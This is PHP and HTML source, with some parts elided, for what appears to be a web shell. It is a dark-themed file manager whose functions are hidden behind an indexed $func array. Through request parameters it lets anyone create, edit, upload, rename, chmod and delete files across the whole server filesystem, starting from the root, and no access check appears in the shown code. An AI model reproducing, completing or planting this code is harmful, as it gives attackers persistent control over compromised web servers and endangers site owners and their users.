...
if (isset($_POST['newFolderName'])) {
	if ($func[29]($path . '/' . $_POST['newFolderName'])) {
		$func[16]("Create Folder Successfully!", "Success", "success", "?dir=$path&g=$yid");
	} else {
		$func[16]("Create Folder Failed", "Failed", "error", "?dir=$path&g=$yid");
	}
}
if (isset($_POST['newFileName']) && isset($_POST['newFileContent'])) {
	if ($func[4]($_POST['newFileName'], $_POST['newFileContent'])) {
		$func[16]("Create File Successfully!", "Success", "success", "?dir=$path&g=$yid");
	} else {
		$func[16]("Create File Failed", "Failed", "error", "?dir=$path&g=$yid");
	}
}

if (isset($_POST['newName']) && isset($_GET['item'])) {
	if ($_POST['newName'] == '') {
		$func[16]("You miss an important value", "Ooopss..", "warning", "?dir=$path&g=$yid");
	}
	if ($func[30]($path. '/'. $_GET['item'], $_POST['newName'])) {
		$func[16]("Rename Successfully!", "Success", "success", "?dir=$path&g=$yid");
	} else {
		$func[16]("Rename Failed", "Failed", "error", "?dir=$path&g=$yid");
	}
}
if (isset($_POST['newContent']) && isset($_GET['item'])) {
	if ($func[4]($path. '/'. $_GET['item'], $_POST['newContent'])) {
		$func[16]("Edit Successfully!", "Success", "success", "?dir=$path&g=$yid");
	} else {
		$func[16]("Edit Failed", "Failed", "error", "?dir=$path&g=$yid");
	}
}
if (isset($_POST['newPerm']) && isset($_GET['item'])) {
	...
	if (chmod($path. '/'. $_GET['item'], $_POST['newPerm'])) {
		$func[16]("Change Permission Successfully!", "Success", "success", "?dir=$path&g=$yid");
	} else {
		$func[16]("Change Permission", "Failed", "error", "?dir=$path&g=$yid");
	}
}
if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['item'])) {
	if (is_dir($_GET['item'])) {
		if ($func[27]($_GET['item'])) {
			$func[16]("Delete Successfully!", "Success", "success", "?dir=$path&g=$yid");
		} else {
			$func[16]("Delete Failed", "Failed", "error", "?dir=$path&g=$yid");
		}
	} else {
...
if (isset($_FILES['uploadfile'])) {
	if ($func[17]( $_FILES['uploadfile']['tmp_name'], $_FILES['uploadfile']['name'])) {
		$func[16]("Upload Successfully!", "Success", "success", "?dir=$path&g=$yid");
	} else {
		$func[16]("Upload Failed", "Failed", "error", "?dir=$path&g=$yid");
	}
}
$dirs = $func[18]($path);
			...
			<div class="box shadow bg-dark p-4 rounded-3">
				...
				<div class="breadcrumb">
					<i class="fa fa-home pt-1 me-1"></i> ~ <span class="mx-1"><?php foreach ($exdir as $id => $pat) : 
						if ($pat == '' && $id == 0):
					?>
					<a href="?dir=/&g=<?= $yid ?>" class="text-decoration-none text-light">/</a>
					...
					<table class="table table-hover table-gray text-light">
						...
						<tbody class="text-nowrap">
							...
							<tr>
								<td>
									<?php if ($dir === '..') : ?>
									<a href="?dir=<?= $func[22]($path); ?>&g=<?= $yid ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
									<?php elseif ($dir === '.') :  ?>
									<a href="?dir=<?= $path; ?>&g=<?= $yid ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
									<?php else : ?>
									<a href="?dir=<?= $path . '/' . $dir ?>&g=<?= $yid ?>" class="text-decoration-none text-light"><i class="fa fa-folder"></i> <?= $dir ?></a>
									<?php endif; ?>
								</td>
								...
								<td>
									<?php if ($dir != '.' && $dir != '..') : ?>
									<div class="btn-group">
										<a href="?dir=<?= $path ?>&g=<?= $yid ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1">rename<i class="fa fa-edit"></i></a>
										<a href="?dir=<?= $path ?>&g=<?= $yid ?>&item=<?= $dir ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1">chmod<i class="fa fa-file-signature"></i></a>
										<a href="" class="btn btn-outline-light btn-sm mr-1" onClick="return deleteConfirm('?dir=<?= $path ?>&g=<?= $yid ?>&item=<?= $dir ?>&action=delete')">hapus<i class="fa fa-trash"></i></a>
									</div>
									<?php elseif ($dir === '.') : ?>
							...
							<tr>
								...
								<td>
									<?php if ($dir != '.' && $dir != '..') : ?>
									<div class="btn-group" role="group" aria-label="Basic example">
										<a href="?dir=<?= $path ?>&g=<?= $yid ?>&item=<?= $dir ?>&action=edit" class="btn btn-outline-light btn-sm mr-1">edit<i class="fa fa-file-edit"></i></a>
										<a href="?dir=<?= $path ?>&g=<?= $yid ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1">rename<i class="fa fa-edit"></i></a>
										<a href="?dir=<?= $path ?>&g=<?= $yid ?>&item=<?= $dir ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1">chmod<i class="fa fa-file-signature"></i></a>
										<a href="?dir=<?= $path ?>&g=<?= $yid ?>&item=<?= $dir ?>&action=delete" class="btn btn-outline-light btn-sm mr-1" onClick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')">hapus<i class="fa fa-trash"></i></a>
									</div>
									<?php endif; ?>
								</td>
							</tr>
